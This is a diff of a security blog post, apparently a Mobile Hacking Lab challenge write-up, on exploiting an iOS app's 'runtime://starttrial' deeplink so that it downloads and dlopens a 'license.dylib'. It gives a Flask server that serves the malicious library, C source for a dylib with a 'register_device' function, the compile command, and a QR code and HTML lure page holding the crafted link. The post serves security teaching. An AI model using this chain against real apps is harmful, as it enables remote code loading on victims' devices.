-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> $$closure_#<span style="color:#bd93f9">1</span>_@<span style="color:#50fa7b">Sendable_</span>(Foundation.Data<span style="color:#ff79c6">?</span>,__C.NSURLResponse<span style="color:#ff79c6">?</span>,Swift.Error<span style="color:#ff79c6">?</span>)_<span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">_</span>()_in_Runtime.Subs cribeController.<span style="color:#50fa7b">getLicenseFile</span>(<span style="color:#8be9fd;font-style:italic">server</span>:_Swift.String,<span style="color:#8be9fd;font-style:italic">withToken</span>:_Swift.String)_<span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">_</span>()
-</span></span><span style="display:flex;"><span>               (undefined <span style="color:#ff79c6">*</span>param_1,uint param_2,<span style="color:#8be9fd">int</span> param_3,<span style="color:#8be9fd">int</span> param_4,undefined8 param_5,
-</span></span><span style="display:flex;"><span>               <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>param_6)
-</span></span></code></pre></div><p><img src="/images/runner-04.png" alt=""></p>
-<p>The closure first checks for network errors, showing a &quot;Cannot connect to host while getting license&quot; toast if any occur, and exits early. It then verifies the HTTP response status code, displaying &quot;Unable to authenticate to server&quot; if it’s 401, and exits. Next, it checks the Content-Type header, expecting &quot;application/octet-stream&quot;; if mismatched, it notifies &quot;Unexpected response from server (download path not available)&quot; and exits. If valid, it saves the downloaded data as license.dylib, creating necessary directories and handling file operation errors. The closure attempts to dynamically load this library (dlopen), showing an error toast if loading fails. Upon success, it looks up a register_device function; failure to find or execute it triggers a &quot;Device registration failed&quot; toast, while success shows a message acknowledging the Pro upgrade.  Another thing is the function expect a function called <strong>register_device</strong></p>
-<p><img src="/images/runner-05.png" alt=""></p>
-<h3 id="exploit">Exploit</h3>
-<p>The following steps could be use..</p>
-<ol>
-<li>Bypass the mhl.pages.dev verification</li>
-<li>Create a server that &quot;serves&quot; the malicious dylib</li>
-</ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> flask <span style="color:#ff79c6">import</span> Flask, jsonify, request, send_from_directory
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> os
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>app <span style="color:#ff79c6">=</span> Flask(__name__)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ROOT_PATH <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>dirname(os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>abspath(__file__))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>@app.route(<span style="color:#f1fa8c">&#39;/health&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;GET&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">health</span>():
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> jsonify({<span style="color:#f1fa8c">&#34;status&#34;</span>: <span style="color:#f1fa8c">&#34;healthy&#34;</span>})
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>@app.route(<span style="color:#f1fa8c">&#39;/activate&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;POST&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">activate</span>():
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> jsonify({<span style="color:#f1fa8c">&#34;token&#34;</span>: <span style="color:#f1fa8c">&#34;A1B2C3D4-E5F6-7890-ABCD-1234567890EF&#34;</span>}) <span style="color:#6272a4">#valid variation </span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>@app.route(<span style="color:#f1fa8c">&#39;/download&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;GET&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">download</span>():
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    response <span style="color:#ff79c6">=</span> send_from_directory(directory<span style="color:#ff79c6">=</span>ROOT_PATH, path<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;license.dylib&#39;</span>, as_attachment<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
-</span></span><span style="display:flex;"><span>    response<span style="color:#ff79c6">.</span>headers[<span style="color:#f1fa8c">&#34;Content-Type&#34;</span>] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;application/octet-stream&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> response
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>@app.route(<span style="color:#f1fa8c">&#39;/runtime&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;GET&#39;</span>, <span style="color:#f1fa8c">&#39;POST&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">handle_runtime</span>():
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> jsonify({<span style="color:#f1fa8c">&#34;error&#34;</span>: <span style="color:#f1fa8c">&#34;Invalid request&#34;</span>}), <span style="color:#bd93f9">400</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
-</span></span><span style="display:flex;"><span>    context <span style="color:#ff79c6">=</span> (<span style="color:#f1fa8c">&#39;cert.pem&#39;</span>, <span style="color:#f1fa8c">&#39;key.pem&#39;</span>) 
-</span></span><span style="display:flex;"><span>    app<span style="color:#ff79c6">.</span>run(host<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;0.0.0.0&#39;</span>, port<span style="color:#ff79c6">=</span><span style="color:#bd93f9">8000</span>, ssl_context<span style="color:#ff79c6">=</span>context)
-</span></span></code></pre></div><ul>
-<li>malicious dylib</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
-</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
-</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
-</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;dlfcn.h&gt;</span><span style="color:#ff79c6">
-</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">register_device</span>(<span style="color:#8be9fd">void</span>) {
-</span></span><span style="display:flex;"><span>    FILE <span style="color:#ff79c6">*</span>file <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fopen</span>(<span style="color:#f1fa8c">&#34;license.txt&#34;</span>, <span style="color:#f1fa8c">&#34;w&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (file) {
-</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">fprintf</span>(file, <span style="color:#f1fa8c">&#34;Rick Harry was here!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">fclose</span>(file);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>compile: <code>clang -arch arm64 -dynamiclib -o license.dylib foo.c</code></p>
-<p>We can bypass the validation with this trick :P</p>
-<p><img src="/images/runner-06.png" alt=""></p>
-<p>To exploit the deeplink, we can create a qrcode or a html page with a tag:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>qrencode <span style="color:#f1fa8c">&#34;runtime://starttrial?server=mhl.pages.dev:8000&amp;trialKey=1234-5678-ABCD&#34;</span> -o rick.png
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">html</span>&gt;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">h1</span>&gt; Click Me DaddY! &lt;/<span style="color:#ff79c6">h1</span>&gt;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">a</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;runtime://starttrial?server=mhl.pages.dev:8000&amp;trialKey=1234-5678-ABCD&#34;</span>&gt;Click me&lt;/<span style="color:#ff79c6">a</span>&gt;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">html</span>&gt;
-</span></span></code></pre></div><p>Final POC:</p>
-<p><img src="/images/ruuner.gif" alt="a"></p>
-
-  </div>
-
-  <footer class="post-footer fade-in">
-    <div class="post-nav">
-      
-      <a href="https://incogbyte.github.io/posts/captain-no-hook-mobilehackinglabs/" class="post-nav-link prev">
-        <span>← Previous</span>
-        <span class="post-nav-title">Captain No Hook Mobile Hacking Labs</span>
-      </a>
-      
-      
-      <a href="https://incogbyte.github.io/posts/2026-03-17-phpipam-second-order-sqli/" class="post-nav-link next">
-        <span>Next →</span>
-        <span class="post-nav-title">phpIPAM 1.7.4 - Second Order SQL Injection via subnetOrdering</span>
-      </a>
-      
-    </div>
-  </footer>
-</article>
-
-  </main>
-
-  <footer class="site-footer">
-  <div class="footer-content">
-    <div class="footer-links">
-      <a href="https://github.com/incogbyte" target="_blank" rel="noopener" aria-label="GitHub">GitHub</a>
-      <a href="https://x.com/incogbyte" target="_blank" rel="noopener" aria-label="X/Twitter">X</a>
-      <a href="https://linkedin.com/in/rodolfo-tavares-543863a7" target="_blank" rel="noopener" aria-label="LinkedIn">LinkedIn</a>
-      <a href="https://infosec.exchange/@incogbyte" target="_blank" rel="noopener" aria-label="Mastodon">Mastodon</a>
-    </div>
-    <p class="footer-copy">&copy; 2026 Rodolfo Tavares — Built with Hugo</p>
-  </div>
-</footer>
-
-
-  <script src="/js/matrix.js"></script>
-  <script src="/js/main.js"></script>
-</body>
-</html>
+The trialSubscription method in Runtime::SubscribeController attempts to <strong>open a specific URL</strong> that starts a trial subscription in the app. ( runtime://starttrial?server=mhl.pages.dev/runtime trialKey=1234-5678-ABCD )</p><p>This function belongs to the SubscribeController class and performs license verification.
+It first checks if the server string contains mhl.pages.dev; if not, it shows an “Invalid Server” error. If the license key contains buypro, it redirects the user to a purchase URL after confirming the device can open it. Otherwise, it validates the license key format against a regex pattern (e.g., “1234-5678-ABCD”); if invalid, it shows an error. If valid, it builds a URL to http://server/health and sends an HTTP request to verify the license. The response is handled asynchronously to confirm license validity. In summary, the function validates inputs and verifies the license by querying the server’s health endpoint.</p><p>Now we need to find the dlyb injection. The function that handle this is:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8be9fd>void</span> $$closure_#<span style=color:#bd93f9>1</span>_@<span style=color:#50fa7b>Sendable_</span>(Foundation.Data<span style=color:#ff79c6>?</span>,__C.NSURLResponse<span style=color:#ff79c6>?</span>,Swift.Error<span style=color:#ff79c6>?</span>)_<span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>_</span>()_in_Runtime.Subs cribeController.<span style=color:#50fa7b>getLicenseFile</span>(<span style=color:#8be9fd;font-style:italic>server</span>:_Swift.String,<span style=color:#8be9fd;font-style:italic>withToken</span>:_Swift.String)_<span style=color:#ff79c6>-&gt;</span><span style=color:#50fa7b>_</span>()
+</span></span><span style=display:flex><span>               (undefined <span style=color:#ff79c6>*</span>param_1,uint param_2,<span style=color:#8be9fd>int</span> param_3,<span style=color:#8be9fd>int</span> param_4,undefined8 param_5,
+</span></span><span style=display:flex><span>               <span style=color:#8be9fd>void</span> <span style=color:#ff79c6>*</span>param_6)
+</span></span></code></pre></div><p><img src=/images/runner-04.png alt></p><p>The closure first checks for network errors, showing a "Cannot connect to host while getting license" toast if any occur, and exits early. It then verifies the HTTP response status code, displaying "Unable to authenticate to server" if it’s 401, and exits. Next, it checks the Content-Type header, expecting "application/octet-stream"; if mismatched, it notifies "Unexpected response from server (download path not available)" and exits. If valid, it saves the downloaded data as license.dylib, creating necessary directories and handling file operation errors. The closure attempts to dynamically load this library (dlopen), showing an error toast if loading fails. Upon success, it looks up a register_device function; failure to find or execute it triggers a "Device registration failed" toast, while success shows a message acknowledging the Pro upgrade. Another thing is the function expect a function called <strong>register_device</strong></p><p><img src=/images/runner-05.png alt></p><h3 id=exploit>Exploit</h3><p>The following steps could be use..</p><ol><li>Bypass the mhl.pages.dev verification</li><li>Create a server that "serves" the malicious dylib</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> flask <span style=color:#ff79c6>import</span> Flask, jsonify, request, send_from_directory
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> os
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>app <span style=color:#ff79c6>=</span> Flask(__name__)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ROOT_PATH <span style=color:#ff79c6>=</span> os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>dirname(os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>abspath(__file__))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>@app.route(<span style=color:#f1fa8c>&#39;/health&#39;</span>, methods<span style=color:#ff79c6>=</span>[<span style=color:#f1fa8c>&#39;GET&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>health</span>():
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> jsonify({<span style=color:#f1fa8c>&#34;status&#34;</span>: <span style=color:#f1fa8c>&#34;healthy&#34;</span>})
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>@app.route(<span style=color:#f1fa8c>&#39;/activate&#39;</span>, methods<span style=color:#ff79c6>=</span>[<span style=color:#f1fa8c>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>activate</span>():
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> jsonify({<span style=color:#f1fa8c>&#34;token&#34;</span>: <span style=color:#f1fa8c>&#34;A1B2C3D4-E5F6-7890-ABCD-1234567890EF&#34;</span>}) <span style=color:#6272a4>#valid variation </span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>@app.route(<span style=color:#f1fa8c>&#39;/download&#39;</span>, methods<span style=color:#ff79c6>=</span>[<span style=color:#f1fa8c>&#39;GET&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>download</span>():
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    response <span style=color:#ff79c6>=</span> send_from_directory(directory<span style=color:#ff79c6>=</span>ROOT_PATH, path<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;license.dylib&#39;</span>, as_attachment<span style=color:#ff79c6>=</span><span style=color:#ff79c6>True</span>)
+</span></span><span style=display:flex><span>    response<span style=color:#ff79c6>.</span>headers[<span style=color:#f1fa8c>&#34;Content-Type&#34;</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;application/octet-stream&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> response
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>@app.route(<span style=color:#f1fa8c>&#39;/runtime&#39;</span>, methods<span style=color:#ff79c6>=</span>[<span style=color:#f1fa8c>&#39;GET&#39;</span>, <span style=color:#f1fa8c>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>handle_runtime</span>():
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> jsonify({<span style=color:#f1fa8c>&#34;error&#34;</span>: <span style=color:#f1fa8c>&#34;Invalid request&#34;</span>}), <span style=color:#bd93f9>400</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>if</span> __name__ <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;__main__&#39;</span>:
+</span></span><span style=display:flex><span>    context <span style=color:#ff79c6>=</span> (<span style=color:#f1fa8c>&#39;cert.pem&#39;</span>, <span style=color:#f1fa8c>&#39;key.pem&#39;</span>) 
+</span></span><span style=display:flex><span>    app<span style=color:#ff79c6>.</span>run(host<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;0.0.0.0&#39;</span>, port<span style=color:#ff79c6>=</span><span style=color:#bd93f9>8000</span>, ssl_context<span style=color:#ff79c6>=</span>context)
+</span></span></code></pre></div><ul><li>malicious dylib</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff79c6>#include</span> <span style=color:#ff79c6>&lt;stdio.h&gt;</span><span style=color:#ff79c6>
+</span></span></span><span style=display:flex><span><span style=color:#ff79c6>#include</span> <span style=color:#ff79c6>&lt;stdlib.h&gt;</span><span style=color:#ff79c6>
+</span></span></span><span style=display:flex><span><span style=color:#ff79c6>#include</span> <span style=color:#ff79c6>&lt;string.h&gt;</span><span style=color:#ff79c6>
+</span></span></span><span style=display:flex><span><span style=color:#ff79c6>#include</span> <span style=color:#ff79c6>&lt;dlfcn.h&gt;</span><span style=color:#ff79c6>
+</span></span></span><span style=display:flex><span><span style=color:#ff79c6></span>
+</span></span><span style=display:flex><span><span style=color:#8be9fd>int</span> <span style=color:#50fa7b>register_device</span>(<span style=color:#8be9fd>void</span>) {
+</span></span><span style=display:flex><span>    FILE <span style=color:#ff79c6>*</span>file <span style=color:#ff79c6>=</span> <span style=color:#50fa7b>fopen</span>(<span style=color:#f1fa8c>&#34;license.txt&#34;</span>, <span style=color:#f1fa8c>&#34;w&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> (file) {
+</span></span><span style=display:flex><span>        <span style=color:#50fa7b>fprintf</span>(file, <span style=color:#f1fa8c>&#34;Rick Harry was here!</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#50fa7b>fclose</span>(file);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>1</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>compile: <code>clang -arch arm64 -dynamiclib -o license.dylib foo.c</code></p><p>We can bypass the validation with this trick :P</p><p><img src=/images/runner-06.png alt></p><p>To exploit the deeplink, we can create a qrcode or a html page with a tag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
+</span></span><span style=display:flex><span>qrencode <span style=color:#f1fa8c>&#34;runtime://starttrial?server=mhl.pages.dev:8000&amp;trialKey=1234-5678-ABCD&#34;</span> -o rick.png
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#ff79c6>html</span>&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;<span style=color:#ff79c6>h1</span>&gt; Click Me DaddY! &lt;/<span style=color:#ff79c6>h1</span>&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;<span style=color:#ff79c6>a</span> <span style=color:#50fa7b>href</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;runtime://starttrial?server=mhl.pages.dev:8000&amp;trialKey=1234-5678-ABCD&#34;</span>&gt;Click me&lt;/<span style=color:#ff79c6>a</span>&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;/<span style=color:#ff79c6>html</span>&gt;
+</span></span></code></pre></div><p>Final POC:</p><p><img src=/images/ruuner.gif alt=a></p></div><footer class="post-footer fade-in"><div class=post-nav><a href=https://incogbyte.github.io/posts/captain-no-hook-mobilehackinglabs/ class="post-nav-link prev"><span>← Previous</span>
+<span class=post-nav-title>Captain No Hook Mobile Hacking Labs</span>
+</a><a href=https://incogbyte.github.io/posts/2026-03-17-phpipam-second-order-sqli/ class="post-nav-link next"><span>Next →</span>
+<span class=post-nav-title>phpIPAM 1.7.4 - Second Order SQL Injection via subnetOrdering</span></a></div></footer></article></main><footer class=site-footer><div class=footer-content><p><span class=footer-prompt>~/incogbyte</span> <span>Security research, notes and disclosures.</span></p><nav class=footer-links aria-label="External profiles"><a href=https://github.com/incogbyte target=_blank rel="noopener noreferrer">GitHub</a>
+<a href=https://linkedin.com/in/rodolfo-tavares-543863a7 target=_blank rel="noopener noreferrer">LinkedIn</a>
+<a href=mailto:incogbyte@protonmail.com>Email</a>
+<a href=/index.xml>RSS</a></nav></div></footer><script src=/js/main.js></script></body></html>
